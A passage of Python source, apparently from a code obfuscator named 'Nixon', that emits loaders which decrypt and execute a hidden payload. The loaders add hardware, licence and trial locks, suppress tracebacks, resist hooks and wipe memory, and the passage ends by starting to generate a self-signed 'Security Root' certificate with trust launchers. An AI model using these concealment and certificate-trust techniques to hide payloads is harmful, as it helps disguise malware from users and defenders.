        _phase4_suffix += _kl_emit() + "\n"
    except Exception:
        pass
    # AUDIT GAPS #52/#75: MAC-bound trial deadline + clock-rollback gate.
    # Additive: only when trial_seconds is set; None/0 keeps current
    # behavior (plain _NX_TRIAL_SECONDS marker, no gate). The gate is a
    # self-contained snippet from obfuscator.trial_bind (stdlib only):
    # HMAC(deadline || fingerprint, build_key) + sealed last-seen state.
    # _NX_TRIAL_GATE emits "DISABLED" when no trial is configured so
    # artifacts without --trial never pay for (or risk) the check.
    try:
        from obfuscator.trial_bind import (
            build_trial_context as _tb_ctx,
            emit_trial_snippet as _tb_emit,
        )
        _tb_trial_secs = None
        try:
            _tb_trial_secs = (None if trial_seconds is None
                              else float(trial_seconds))
        except Exception:
            _tb_trial_secs = None
        if _tb_trial_secs and _tb_trial_secs > 0:
            _tb_build_ctx = _tb_ctx(_tb_trial_secs, hwid=str(hwid or ""))
            _tb_key_hex = bytes(_tb_build_ctx["build_key"]).hex()
            _tb_snippet = _tb_emit(int(_tb_build_ctx["deadline"]),
                                   str(_tb_build_ctx["token"]),
                                   _tb_key_hex)
            _phase4_suffix += ("_NX_TRIAL_KEY = %r\n" % (_tb_key_hex,))
            _phase4_suffix += ("_NX_TRIAL_DEADLINE = %r\n" % (
                int(_tb_build_ctx["deadline"]),))
            _phase4_suffix += ("_NX_TRIAL_TOKEN = %r\n" % (
                str(_tb_build_ctx["token"]),))
            _phase4_suffix += ("_NX_TRIAL_HWID_HINT = %r\n" % (
                str(hwid or ""),))
            _phase4_suffix += _tb_snippet + "\n"
            _phase4_suffix += (
                "_NX_TRIAL_GATE = _nx_trial_gate(%r)\n"
                % (str(hwid or ""),)
            )
            # Kill-ladder mapping: expired/rollback/tampered verdicts funnel
            # through _nx_kill (reason codes match kill_ladder.REASON_CODES).
            _phase4_suffix += (
                "if _NX_TRIAL_GATE != \"ok\":\n"
                "    _nx_kill(\"trial-\" + str(_NX_TRIAL_GATE))\n"
            )
        else:
            _phase4_suffix += "_NX_TRIAL_GATE = \"DISABLED\"\n"
    except SystemExit:
        raise
    except Exception:
        try:
            _phase4_suffix += "_NX_TRIAL_GATE = \"DISABLED\"\n"
        except Exception:
            pass
    # AUDIT GAP #71: runtime watermark refuse-to-run gate. Additive: only
    # when watermark is set; None/"" keeps current behavior (plain
    # _NX_WATERMARK_GATE marker = DISABLED, no gate). The gate is a
    # self-contained snippet from obfuscator.watermark_gate (stdlib only):
    # HMAC(message, build_key) + sealed presence marker. A stripped or
    # tampered watermark fails closed via _nx_kill (exit 137; same shape
    # as the trial gate above), before any payload runs.
    try:
        from obfuscator.watermark_gate import (
            build_watermark_context as _wm_ctx,
        )
        _wm_message = str(watermark) if watermark is not None else ""
        if _wm_message:
            _wm_build_ctx = _wm_ctx(_wm_message, build_key=watermark_key)
            _wm_key_hex = bytes(_wm_build_ctx["build_key"]).hex()
            from obfuscator.watermark_gate import (
                emit_watermark_snippet as _wm_emit,
            )
            _wm_snippet = _wm_emit(str(_wm_build_ctx["message"]),
                                   str(_wm_build_ctx["tag"]),
                                   _wm_key_hex,
                                   str(_wm_build_ctx["marker"]))
            _phase4_suffix += ("_NX_WATERMARK_KEY = %r\n" % (_wm_key_hex,))
            _phase4_suffix += ("_NX_WATERMARK_MSG = %r\n" % (
                str(_wm_build_ctx["message"]),))
            _phase4_suffix += ("_NX_WATERMARK_TAG = %r\n" % (
                str(_wm_build_ctx["tag"]),))
            _phase4_suffix += ("_NX_WATERMARK_MARKER = %r\n" % (
                str(_wm_build_ctx["marker"]),))
            _phase4_suffix += _wm_snippet + "\n"
            _phase4_suffix += (
                "_NX_WATERMARK_GATE = _nx_watermark_gate()\n"
            )
            _phase4_suffix += (
                "if _NX_WATERMARK_GATE != \"ok\":\n"
                "    _nx_kill(\"watermark-\" + str(_NX_WATERMARK_GATE))\n"
            )
        else:
            _phase4_suffix += "_NX_WATERMARK_GATE = \"DISABLED\"\n"
    except SystemExit:
        raise
    except Exception:
        try:
            _phase4_suffix += "_NX_WATERMARK_GATE = \"DISABLED\"\n"
        except Exception:
            pass
    # Batch-3 build-id salt (additive, safe default): when None, mint a
    # fresh random id so identical payload+key pairs still emit different
    # blobs/loaders per build. Pass a fixed string for deterministic tests.
    if build_id is None:
        try:
            build_id = os.urandom(8).hex()
        except Exception:
            build_id = uuid.uuid4().hex[:16]
    build_id = str(build_id)
    # HWID-lock marker: the lock pack itself travels INSIDE the fallback blob
    # (locked bytes are the payload), so the loader only needs an on/off flag
    # to decide whether to JSON-parse + unlock the decompressed bytes.
    # GAP #33 static fingerprint: when --hwid is a canonical 'HWID:<64 hex>'
    # static fingerprint, validate + canonicalize it here (fail closed on
    # malformed 'HWID:' values) and embed it as _NX_HWID_STATIC so the
    # inline unlock uses it verbatim instead of dynamic uuid.getnode()
    # collection. PBKDF2 derivation downstream is unchanged. Empty hwid
    # (or non-static hwid) keeps the dynamic path byte-identical to before.
    _static_hwid = ""
    try:
        from obfuscator.hwid_lock import normalize_static_hwid as _norm_static
        _hwid_str = str(hwid or "")
        if _hwid_str.startswith("HWID:"):
            _static_hwid = _norm_static(_hwid_str)
    except ValueError:
        raise
    except Exception:
        _static_hwid = ""
    _phase4_suffix += ("_NX_HWID_LOCK = %r\n" % ("ENABLED" if hwid_lock else "DISABLED",))
    _phase4_suffix += ("_NX_HWID_STATIC = %r\n" % (_static_hwid,))
    _phase4_suffix += (
        "def _nx_hwid_mac():\n"
        "    try:\n"
        "        import os as _o\n"
        "        for _n in sorted(_o.listdir('/sys/class/net')):\n"
        "            if _n == 'lo': continue\n"
        "            try:\n"
        "                with open('/sys/class/net/' + _n + '/address') as _f:\n"
        "                    _m = _f.read().strip().lower().replace(':', '')\n"
        "            except Exception: continue\n"
        "            if len(_m) == 12 and _m != '0' * 12: return _m\n"
        "    except Exception: pass\n"
        "    return '0'\n"
        "\n"
        "\n"
        "def _nx_hwid_unlock(blob_bytes):\n"
        "    import hashlib as _hl_hashlib, json as _hl_json\n"
        "    import hmac as _hl_hmac\n"
        "    if _NX_HWID_LOCK == \"DISABLED\":\n"
        "        return blob_bytes\n"
        "    try:\n"
        "        _pack = _hl_json.loads(bytes(blob_bytes).decode(\"utf-8\"))\n"
        "        _salt = bytes.fromhex(_pack[\"salt\"])\n"
        "        _nonce = bytes.fromhex(_pack[\"nonce\"])\n"
        "        _enc = bytes.fromhex(_pack[\"data\"])\n"
        "    except Exception:\n"
        "        raise ValueError(\"bad hwid lock pack\")\n"
        # Not uuid.getnode(): it can shell out to ip/ifconfig/arp and
        # blocks for minutes inside this threaded loader.
        "    _hwid = _NX_HWID_STATIC if _NX_HWID_STATIC else _nx_hwid_mac()\n"
        "    _key = _hl_hashlib.pbkdf2_hmac(\"sha256\", _hwid.encode(), _salt, 100000, dklen=32)\n"
        "    def _ks(_k, _n, _ln):\n"
        "        _out = bytearray()\n"
        "        _c = 0\n"
        "        while len(_out) < _ln:\n"
        "            _out.extend(_hl_hashlib.sha256(_k + _n + _c.to_bytes(8, \"big\")).digest())\n"
        "            _c += 1\n"
        "        return bytes(_out[:_ln])\n"
        "    _tagged = bytes(_a ^ _b for _a, _b in zip(_enc, _ks(_key, _nonce, len(_enc))))\n"
        "    if len(_tagged) < 32:\n"
        "        raise ValueError(\"hwid unlock failed (truncated)\")\n"
        "    _tag, _data = _tagged[:32], _tagged[32:]\n"
        "    if not _hl_hmac.compare_digest(_hl_hashlib.sha256(_data).digest(), _tag):\n"
        "        raise ValueError(\"hwid unlock failed: wrong host or tampered data\")\n"
        "    return _data\n"
    )
    loader_template = r'''# -*- coding: utf-8 -*-
# Traceback suppression (V10 v6.0 parity: sys.tracebacklimit = 0 +
# excepthook override): loader tracebacks leak host paths + loader
# internals. Installed FIRST so every later failure is silent. Opt-out
# at runtime via NIXON_TRACEBACKS=1 (diagnostics).
import sys as _nx_tb_sys
import os as _nx_tb_os
try:
    if _nx_tb_os.environ.get("NIXON_TRACEBACKS", "0") == "0":
        _nx_tb_sys.tracebacklimit = 0
        def _nx_quiet_excepthook(_t, _v, _tb, _s=_nx_tb_sys):
            try:
                _s.stderr.write("fatal error\n")
            except Exception:
                pass
            try:
                _s.exit(1)
            except Exception:
                pass
        _nx_tb_sys.excepthook = _nx_quiet_excepthook
except Exception:
    pass
del _nx_tb_sys
try:
    del _nx_tb_os
except Exception:
    pass
try:
    del _nx_quiet_excepthook
except Exception:
    pass
import sys, platform, base64, zlib, bz2, lzma, tempfile, os, importlib.util
import ctypes as _ct_loader
_ctypes_pythonapi = _ct_loader.pythonapi
_ctypes_c_char_p = _ct_loader.c_char_p
_ctypes_c_ssize_t = _ct_loader.c_ssize_t
_ctypes_py_object = _ct_loader.py_object
NATIVE_BLOBS = "__NATIVE_BLOBS_PLACEHOLDER__"
FALLBACK_BLOB = "{fallback_blob_val}"
# Batch-3 key emission (XOR-split shares + per-build salt). Placeholders are
# replaced at pack time from obfuscator/key_emit.py; the effective key is
# xor(raw, sha256(_NX_BUILD_ID)) so per-build outputs differ. A tampered
# build id derives a wrong key and decrypt fails. Share/plaintext buffers
# are bytearrays so _nx_wipe can zero them via ctypes.memset after use.
_NX_BUILD_ID = "{build_id}"
# Empty unless the build is bound to one customer: a second,
# domain-separated mask over the payload key (see key_emit).
_NX_CUSTOMER_SALT = "{customer_salt}"
# True when the payload key is bound to a licence token: the mask
# comes from the token's key material at run time, not from a
# literal, so an artefact without its token derives a wrong key.
_NX_LICENCE_BOUND = "{licence_bound}" == "1"


def _nx_licence_key():
    """Key material from the customer's licence token, or None.

    NIXON_LICENCE names the token; otherwise the usual names are
    tried next to the artefact and in the working directory.  The
    signature is deliberately not checked here: the material is a
    capability (a forged token derives a key that does not match
    the ciphertext), and the artefact has no Ed25519 without the
    cryptography wheel.
    """
    try:
        import json as _nx_json, os as _nx_os, sys as _nx_sys
        _cands = []
        _named = _nx_os.environ.get("NIXON_LICENCE")
        if _named:
            _cands.append(_named)
        _base = _nx_os.path.dirname(_nx_os.path.abspath(_nx_sys.argv[0] or ""))
        for _d in (_base, _nx_os.getcwd()):
            for _n in ("licence.json", "licence.licence", "license.json"):
                _cands.append(_nx_os.path.join(_d, _n))
        for _c in _cands:
            try:
                with open(_c, "r", encoding="utf-8") as _f:
                    _doc = _nx_json.load(_f)
                _km = (_doc.get("payload") or {}).get("key_material")
                if _km:
                    return str(_km)
            except Exception:
                continue
    except Exception:
        pass
    return None


_BLOB_S0 = "{share0}"
_BLOB_S1 = "{share1}"
def _nx_wipe(obj):
    """Best-effort secure wipe of decrypted buffers (never raises).
    bytearray -> zeroed in place via ctypes.memset (real C memset on the
    live buffer, NOT a Python-level loop the GC can leave copies of);
    bytes (immutable, cannot wipe in place) -> del only, comment why.
    """
    try:
        if isinstance(obj, bytearray):
            if len(obj):
                _ct_loader.memset(_ct_loader.addressof(_ct_loader.c_char.from_buffer(obj)), 0, len(obj))
        # bytes are immutable: no in-place wipe is possible; drop the ref.
    except Exception:
        pass
    return None
def _nx_key_reconstruct():
    """Recombine XOR shares + apply the build-id salt. Wipes intermediates."""
    _s0 = bytearray(base64.b64decode(_BLOB_S0))
    _s1 = bytearray(base64.b64decode(_BLOB_S1))
    _raw = bytearray(_a ^ _b for _a, _b in zip(_s0, _s1))
    import hashlib as _nx_hk
    _mask = _nx_hk.sha256(_NX_BUILD_ID.encode()).digest()
    _key = bytes(_b ^ _mask[_i % len(_mask)] for _i, _b in enumerate(_raw))
    try:
        _salt = _NX_CUSTOMER_SALT
        if not _salt and _NX_LICENCE_BOUND:
            # Bound at build time (--licence-token): the mask comes from
            # the customer's token.  Missing token -> no mask -> wrong
            # key -> garbage plaintext, which is the intended "inert
            # without a licence" behaviour.
            _salt = _nx_licence_key() or ""
        if _salt:
            # Customer binding: a second, domain-separated mask, so an
            # artefact built for one customer does not decrypt for
            # another.
            _cmask = _nx_hk.sha256(b"nx-customer:" + _salt.encode()).digest()
            _key = bytes(_b ^ _cmask[_i % len(_cmask)] for _i, _b in enumerate(_key))
    except Exception:
        pass
    _nx_wipe(_s0)
    _nx_wipe(_s1)
    _nx_wipe(_raw)
    return _key
BLOB_KEY = _nx_key_reconstruct()
# The key the payload is actually decrypted with.  When split-bootstrap
# is armed this becomes the 2-of-3 Shamir reconstruction, so the
# control is on the path that matters and not merely emitted.
_NX_EFF_KEY = BLOB_KEY
del _BLOB_S0
del _BLOB_S1
def _xor_decrypt(data, key):
    k_len = len(key)
    return bytes([b ^ key[i % k_len] for i, b in enumerate(data)])
def _ct_unmarshal(raw):
    """Deserialize payload code object WITHOUT marshal.loads on the data path.

    Two sub-paths, both marshal-hook resistant:
    1. NYSER1 payloads (magic NYS1): pure-Python lambda-template rebuild,
       zero marshal involvement — fully immune.
    2. Legacy marshal payloads: bytes go ONLY through the C-API symbol
       PyMarshal_ReadObjectFromString (resolved via ctypes, which the
       loader imports at top BEFORE any attacker hook can install — the
       import system itself needs marshal for .pyc, so lazy-importing
       ctypes under a hook is a lost cause; top-level import wins).

    NOTE to packers: keep `import ctypes` at loader top-level scope.
    """
    if isinstance(raw, str):
        raw = raw.encode("latin-1")
    if raw[:4] == b"NYS1":
        return _nyser_loads(raw)
    # ctypes is already imported at loader top: no import-system call here,
    # so a marshal hook installed after startup cannot fire on this path.
    # NOTE: must resolve via ctypes.pythonapi (NOT CDLL(None)): CDLL(None)
    # binds the symbol without the GIL-aware calling convention and
    # segfaults on return (verified 2026-09-20). pythonapi sets the
    # correct convention + GIL handling.
    _fn = _ct_loader.pythonapi.PyMarshal_ReadObjectFromString
    _fn.argtypes = [_ctypes_c_char_p, _ctypes_c_ssize_t]
    _fn.restype = _ctypes_py_object
    _buf = bytes(raw)
    return _fn(_buf, len(_buf))
def _nyser_loads(blob):
    """Minimal NYSER1 loader (lambda-template Code.replace + SHA-256).

    Full serializer lives in obfuscator/nyser.py at build time; the
    runtime needs only this self-contained reader so payloads stay lean.
    """
    import hashlib as _h
    if blob[:4] != b"NYS1":
        raise ValueError("bad NYSER1 magic")
    if blob[4] != 1:
        raise ValueError("unsupported NYSER1 format")
    _pos = 5
    def _uvar():
        nonlocal _pos
        _n, _s = 0, 0
        while True:
            _b = blob[_pos]; _pos += 1
            _n |= (_b & 0x7F) << _s
            if not (_b & 0x80):
                return _n
            _s += 7
    def _zz():
        _n = _uvar()
        return (_n >> 1) ^ -(_n & 1)
    def _u8():
        nonlocal _pos
        _v = blob[_pos]; _pos += 1
        return _v
    def _bl():
        _n = _uvar()
        nonlocal _pos
        _b = blob[_pos:_pos + _n]; _pos += _n
        return bytes(_b)
    _major, _minor = blob[_pos], blob[_pos + 1]; _pos += 2
    import sys as _sys_nyser
    if (_major, _minor) != (_sys_nyser.version_info[0], _sys_nyser.version_info[1]):
        raise ValueError("NYSER1 version mismatch — rebuild required")
    _digest = _bl()
    _body_start = _pos
    # Verify BEFORE reconstructing.  This check used to run after the
    # parse, so a tampered body died inside the reader with IndexError
    # (or worse, produced a code object) -- the integrity gate never
    # fired.  hashlib is already imported above.
    if _h.sha256(blob[_body_start:]).digest() != _digest:
        raise ValueError("NYSER1 integrity failure (SHA-256 mismatch)")
    _tpl = (lambda: None).__code__
    def _const():
        _tag = _u8()
        if _tag == 0x07:
            return (None, True, False, Ellipsis)[_u8()]
        if _tag == 0x04:
            return _zz()
        if _tag == 0x05:
            return float(_bl().decode())
        if _tag == 0x06:
            return complex(_bl().decode())
        if _tag == 0x02:
            return _bl()
        if _tag == 0x03:
            return _bl().decode()
        if _tag == 0x08:
            _kind = _u8(); _n = _uvar()
            _items = [_const() for _ in range(_n)]
            return tuple(_items) if _kind == 0 else (_items if _kind == 1 else frozenset(_items))
        if _tag == 0x01:
            return _code()
        raise ValueError("bad NYSER1 tag")
    def _strtup():
        _n = _uvar()
        return tuple(_bl().decode() for _ in range(_n))
    def _code():
        _kw = dict(co_argcount=_uvar(), co_posonlyargcount=_uvar(),
                   co_kwonlyargcount=_uvar(), co_nlocals=_uvar(),
                   co_stacksize=_uvar(), co_flags=_uvar(),
                   co_code=_bl())
        _n = _uvar(); _kw["co_consts"] = tuple(_const() for _ in range(_n))
        _kw["co_names"] = _strtup(); _kw["co_varnames"] = _strtup()
        _kw["co_freevars"] = _strtup(); _kw["co_cellvars"] = _strtup()
        _kw["co_filename"] = _bl().decode(); _kw["co_name"] = _bl().decode()
        _kw["co_firstlineno"] = _uvar(); _kw["co_linetable"] = _bl()
        _kw["co_exceptiontable"] = _bl()
        if not _kw["co_exceptiontable"] and _sys_nyser.version_info < (3, 11):
            del _kw["co_exceptiontable"]
        return _tpl.replace(**_kw)
    try:
        _code_obj = _const()
    except (IndexError, UnicodeDecodeError, KeyError, TypeError) as _e:
        # A malformed body must fail closed as ValueError, not escape as
        # IndexError from the reader.
        raise ValueError("bad NYSER1 payload: %s" % (_e,))
    if _pos != len(blob):
        raise ValueError("NYSER1 trailing bytes")
    return _code_obj
def _exec_fallback():
    try:
        if "DISABLED" in str(FALLBACK_BLOB): sys.exit(1)
        if "PLACEHOLDER" in str(FALLBACK_BLOB):
            return
        # Batch-3 C-WIPE: buffers are bytearray (mutable) so _nx_wipe can
        # zero the LIVE buffers via ctypes.memset after exec. (bytes are
        # immutable: wiping a bytes object would only zero a throwaway
        # copy, so we never hold the plaintext as bytes here.)
        encrypted = bytearray()
        compressed = bytearray()
        if _NX_SECTION_PACK:
            # Section split: the payload arrives as independently sealed
            # sections and is joined here, so the whole encrypted payload
            # is never resident in a single buffer.  A tampered, truncated
            # or mis-keyed pack fails closed (the join returns None).
            _joined = _nx_section_join(_NX_SECTION_PACK, _NX_EFF_KEY)
            if not _joined:
                # Fail closed through the kill ladder (silent, exit 137),
                # like every other tamper path in the loader.
                try:
                    _nx_kill("section-join-failed")
                except Exception:
                    pass
                raise ValueError("section join failed")
            compressed = bytearray(_joined)
        else:
            encrypted = bytearray(base64.b85decode(FALLBACK_BLOB))
            compressed = bytearray(_xor_decrypt(bytes(encrypted), _NX_EFF_KEY))
        # Batch-2 compress contest: backend-ID envelope (0x00=zlib,
        # 0x01=bz2, 0x02=lzma, 0x03=zstd) with backward compat for legacy
        # prefix-less zlib blobs. stdlib-only on the loader path.
        _cc_first = compressed[0] if compressed else -1
        if _cc_first == 0x00:
            raw = bytearray(zlib.decompress(bytes(compressed[1:])))
        elif _cc_first == 0x01:
            raw = bytearray(bz2.decompress(bytes(compressed[1:])))
        elif _cc_first == 0x02:
            raw = bytearray(lzma.decompress(bytes(compressed[1:])))
        elif _cc_first == 0x03:
            try:
                import pyzstd as _cc_zstd  # type: ignore
                raw = bytearray(_cc_zstd.decompress(bytes(compressed[1:])))
            except Exception:
                raw = bytearray(zlib.decompress(bytes(compressed)))
        else:
            raw = bytearray(zlib.decompress(bytes(compressed)))
        # Phase-4 wiring: when the fallback was HWID-locked at build time,
        # raw is a JSON lock pack (utf-8); unwrap it to the marshal payload
        # via the inline PBKDF2 unlock (stdlib only). Unlocked builds skip
        # this branch: _nx_hwid_unlock returns input when DISABLED.
        # Wrong-host/tampered-pack ValueError funnels through the kill
        # ladder (silent 137), NOT traceback+exit(1): _nx_kill is defined
        # by the ladder block always emitted in _phase4_suffix.
        try:
            if _NX_HWID_LOCK != "DISABLED":
                raw = bytearray(_nx_hwid_unlock(bytes(raw)))
        except NameError:
            pass
        except Exception:
            try:
                _nx_kill("hwid-mismatch")
            except Exception:
                pass
            import os as _nx_hwid_os
            _nx_hwid_os._exit(137)
        code = _ct_unmarshal(bytes(raw))
        # Hostguard (opt-in, --hostguard): bind the host namespace,
        # verify exec/eval/compile are unpatched, and only then run the
        # payload.  The snippet used to be emitted but never called, so
        # the control did nothing at all.
        _nx_ns = globals()
        _nx_hg = globals().get("_NX_HOSTGUARD")
        if _nx_hg:
            # Hostguard (opt-in, --hostguard): bind the host namespace,
            # verify exec/eval/compile are unpatched, and only then run
            # the payload.  The snippet used to be emitted but never
            # called, so the control did nothing at all.  The template
            # stays free of hostguard-specific names: the snippet
            # publishes a callable under _NX_HOSTGUARD.
            _nx_hg(code, _nx_ns)
        else:
            exec(code, _nx_ns)
        _nx_wipe(encrypted)
        _nx_wipe(compressed)
        _nx_wipe(raw)
    except BaseException as e:
        try:
            _nx_wipe(bytearray(encrypted))
        except Exception:
            pass
        try:
            _nx_wipe(bytearray(compressed))
        except Exception:
            pass
        try:
            _nx_wipe(bytearray(raw))
        except Exception:
            pass
        import traceback; traceback.print_exc()
        sys.exit(1)
def _load_native():
    system = platform.system().lower()
    blob_key = None
    ext = ""
    path = None
    fd = None
    encrypted_blob = None
    blob_data = None
    spec = None
    module = None
    blobs = None
    fpath = None
    if system == "windows":
        blob_key = "windows"
        ext = ".pyd"
    elif "linux" in system:
        if "ANDROID_ROOT" in os.environ:
             blob_key = "android"
             ext = ".so"
        else:
             blob_key = "linux"
             ext = ".so"
    elif "darwin" in system:
        blob_key = "darwin"
        ext = ".dylib"    
    # Batch-3 CI scope (additive): the SKIP bypass only applies when the
    # CI gate var is ALSO set (NIXON_CI or NIXON_ALLOW_SKIP). Prod artifacts
    # hold the gate with SKIP alone. Single helper keeps all five sites
    # consistent; _NX_CI_OK reads os.environ live at call time.
    def _nx_ci_bypass_ok():
        try:
            _e = os.environ
            if not _e.get('NIXON_VERIFY_SKIP_VERSION_CHECK'):
                return False
            return bool(_e.get('NIXON_CI') or _e.get('NIXON_ALLOW_SKIP'))
        except Exception:
            return False
    if not blob_key or "PLACEHOLDER" in str(NATIVE_BLOBS):
        if _nx_ci_bypass_ok():
            _exec_fallback()
            return sys.modules[__name__]
        return None
    blobs = NATIVE_BLOBS
    if blob_key not in blobs or not blobs[blob_key]:
        if _nx_ci_bypass_ok():
            _exec_fallback()
            return sys.modules[__name__]
        return None
    try:
        encrypted_blob = base64.b85decode(blobs[blob_key])
        blob_data = _xor_decrypt(encrypted_blob, _NX_EFF_KEY)
        fd, path = tempfile.mkstemp(suffix=ext, prefix="_nx_")
        with os.fdopen(fd, "wb") as f:
            f.write(blob_data)
        fpath = path 
        try:
            spec = importlib.util.spec_from_file_location("payload_native", path)
            if spec and spec.loader:
                module = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(module)
                return 
            else:
                if _nx_ci_bypass_ok():
                    _exec_fallback()
                    return sys.modules[__name__]
                return None
        except Exception as load_err:
             if _nx_ci_bypass_ok():
                 _exec_fallback()
                 return sys.modules[__name__]
             return None
    except Exception as main_err:
        if _nx_ci_bypass_ok():
            _exec_fallback()
            return sys.modules[__name__]
        return None
    finally:
        if fpath is not None:
            if os.path.exists(fpath):
                try: 
                    os.unlink(fpath)
                except Exception: 
                    pass
if __name__ == "__main__":
    _load_native()
'''
    # Phase-4 wiring: prepend hostguard (opt-in only), append secure-temp +
    # VM snippets + KOD/trial/HWID-lock markers. Prepending/appending around
    # the template (never inside it) keeps default output behavior unchanged
    # apart from the additive snippets.
    # Batch-3 key emission (safe default = current behavior for callers that
    # pass only key_hex): derive the effective key from the per-build
    # build_id salt, XOR-split it into two b64 shares, and emit the shares
    # (legacy bytes.fromhex line is REBUILT from shares at runtime, so the
    # raw hex literal is never contiguous in the emitted artifact). The
    # caller-supplied bytecode_fallback was encrypted with the RAW key, so
    # re-encrypt it with the effective key: blob bytes differ per build
    # even for identical payload+key.
    from obfuscator.key_emit import (
        derive_effective_key as _ke_derive,
        split_key as _ke_split,
        split_seed_for_build as _ke_seed,
        combine_shares as _ke_combine,
    )
    from obfuscator.core.utils import fast_xor_bytes as _ke_xor
    try:
        _raw_key = bytes.fromhex(key_hex)
    except Exception:
        raise ValueError("key_hex must be hex")
    # Salt FIRST (pack time): effective key = xor(raw, sha256(build_id)).
    # Shares split the RAW key; the loader re-applies the salt at runtime.
    # (Splitting the derived key with a build-bound seed would cancel the
    # salt at runtime: shares ^ seed-stream twice = raw key. Verified
    # 2026-09-20: that ordering derives the raw key, not the salted one.)
    _customer_salt = str(customer_salt or '')
    _eff_key = _ke_derive(_raw_key, build_id, _customer_salt)
    _s0, _s1 = _ke_split(_raw_key, _ke_seed(build_id))
    # Sanity: emitted shares must reconstruct the raw key; salt -> eff key.
    assert _ke_combine(_s0, _s1) == _raw_key, "key share roundtrip failed"
    assert _ke_derive(_ke_combine(_s0, _s1), build_id,
                      _customer_salt) == _eff_key
    # Re-encrypt the caller-supplied fallback blob under the effective key
    # so the loader's derived key actually decrypts it. byte-for-byte, the
    # transform is: decrypt(raw_key) -> plaintext -> encrypt(eff_key).
    _plain = None
    if bytecode_fallback and not native_only:
        try:
            _plain = _ke_xor(bytes(bytecode_fallback), _raw_key)
            bytecode_fallback = _ke_xor(_plain, _eff_key)
        except Exception:
            pass
    # The emitted FALLBACK_BLOB carries the EFFECTIVE-key ciphertext
    # (b85 text) so the loader decrypt path works without further wiring;
    # the second return value stays the same b85 string for callers/tests.
    fallback_compressed = base64.b85encode(bytecode_fallback).decode('ascii') if bytecode_fallback and not native_only else ""
    fallback_blob_val = fallback_compressed if (bytecode_fallback and not native_only) else ("DISABLED" if native_only else "__FALLBACK_BLOB_PLACEHOLDER__")
    # Section split (opt-in): the payload travels as N independently sealed
    # sections instead of one blob, so no single buffer holds the whole
    # encrypted payload and a partial dump yields no complete code object.
    # The sections are sealed with the SAME effective key the loader
    # already derives at runtime, so no second key is introduced.  The
    # single blob is disabled in this mode: the sections ARE the payload.
    _section_pack_val = ""
    _section_snippet = ""
    _section_armed = False
    if section_split and _plain and not native_only:
        try:
            from obfuscator.section_split import (
                emit_loader_snippet as _ss_emit,
                pack_json as _ss_pack,
            )
            _ss_json, _ss_key = _ss_pack(bytes(_plain),
                                         sections=int(section_count or 4),
                                         key=_eff_key)
            assert _ss_key == _eff_key, "section key must be the loader key"
            _section_pack_val = base64.b85encode(_ss_json).decode('ascii')
            _section_snippet = _ss_emit()
            _section_armed = True
            fallback_blob_val = "SECTIONED"
        except Exception as _ss_exc:
            try:
                UI.warn("Section split failed (%s); using the single blob" % (_ss_exc,))
            except Exception:
                pass
            _section_armed = False
            _section_pack_val = ""
            _section_snippet = ""
    # The section pack and its join helper are emitted in the suffix, not
    # in the template: the template is also consumed directly by tests
    # that exec fragments of it, and it must stay free of build-time
    # placeholders.  _exec_fallback reads both at call time.
    try:
        _phase4_suffix += "_NX_SECTION_PACK = %r\n" % (_section_pack_val,)
        _phase4_suffix += _section_snippet
    except Exception:
        pass
    loader_src = (
        loader_template
        .replace("{build_id}", build_id)
        .replace("{customer_salt}", _customer_salt)
        .replace("{licence_bound}", "1" if licence_bound else "0")
        .replace("{share0}", _s0)
        .replace("{share1}", _s1)
        .replace("{fallback_blob_val}", fallback_blob_val)
    )
    assert "{customer_salt}" not in loader_src, "stale customer salt placeholder"
    assert "{licence_bound}" not in loader_src, "stale licence_bound placeholder"
    assert "{share0}" not in loader_src and "{share1}" not in loader_src
    assert "{build_id}" not in loader_src and "{fallback_blob_val}" not in loader_src
    assert "{key_hex}" not in loader_src, "stale {key_hex} placeholder"
    # The payload entry point must be LAST.
    #
    # The template ends with `if __name__ == "__main__": _load_native()`,
    # and the phase-4 suffix -- which holds EVERY gate (VM score, driver
    # gate, snapshot gate, stdlib audit, trial, watermark) -- is appended
    # after it.  That meant the payload was decrypted and executed
    # FIRST, and the gates ran afterwards: a trial-expired artifact ran
    # its payload and only then died.  The gates were advisory.
    #
    # Moving the entry point to the end makes them gating: a gate that
    # fires kills the artifact before the payload ever executes.
    _ENTRY = '\nif __name__ == "__main__":\n    _load_native()\n'
    _entry_at = loader_src.rfind(_ENTRY)
    if _entry_at < 0:
        # Fall back to a looser match so an unexpected template shape
        # cannot silently reintroduce the ordering bug.
        _entry_at = loader_src.rfind('if __name__ == "__main__":')
        if _entry_at < 0:
            raise RuntimeError("loader template lost its __main__ entry point")
        _body = loader_src[:_entry_at]
        _entry = loader_src[_entry_at:]
    else:
        _body = loader_src[:_entry_at]
        _entry = _ENTRY
    loader_src = _phase4_prefix + _body + "\n" + _phase4_suffix + _entry
    return loader_src, native_blobs, fallback_compressed
def validate_obfuscated_code(code_string):
    try:
        compile(code_string, '<validation>', 'exec')
        issues = []
        if 'where it is not associated with a value' in code_string:
            issues.append("Potential UnboundLocalError patterns detected")        
        lines = code_string.split('\n')
        for i, line in enumerate(lines):
            if 'def ' in line or 'class ' in line:
                words = line.split()
                if len(words) >= 2:
                    identifier = words[1].split('(')[0].strip(':')
                    if identifier and not identifier.isidentifier():
                        issues.append(f"Line {i+1}: Invalid identifier '{identifier}'")
        return len(issues) == 0, issues
    except SyntaxError as e:
        return False, [f"Syntax Error: {e}"]
    except Exception as e:
        return False, [f"Validation Error: {e}"]
def generate_dummy_cert(output_dir):
    cert_path = os.path.join(output_dir, "Nixon_Security_Root.cer")
    if os.path.exists(cert_path): return cert_path
    print(" [*] Generating Self-Signed Root Certificate...")
    try:
        cmd = [
            "openssl", "req", "-x509", "-newkey", "rsa:2048", 
            "-keyout", "key.pem", "-out", cert_path, 
            "-days", "3650", "-nodes", 
            "-subj", "/CN=Nixon Security Systems/O=Nixon Labs/C=US"
        ]
        subprocess.run(cmd, check=True, capture_output=True)
        if os.path.exists("key.pem"): os.remove("key.pem")
        if os.path.exists(cert_path): return cert_path
    except Exception: pass
    return None
def generate_trust_launchers(payload_path, output_name_base=None):
    base_dir = os.path.dirname(payload_path)
    filename = os.path.basename(payload_path)
    if output_name_base:
        bat_name = f"RUN_{output_name_base}.bat"
        mac_name = f"RUN_{output_name_base}.command"
    else:
        name_no_ext = os.path.splitext(filename)[0]
        bat_name = f"RUN_{name_no_ext}_WIN.bat"
        mac_name = f"RUN_{name_no_ext}_MAC.command"
    cert_path = generate_dummy_cert(base_dir)
    cert_name = os.path.basename(cert_path) if cert_path else "Nixon_Security_Root.cer"
    bat_path = os.path.join(base_dir, bat_name)
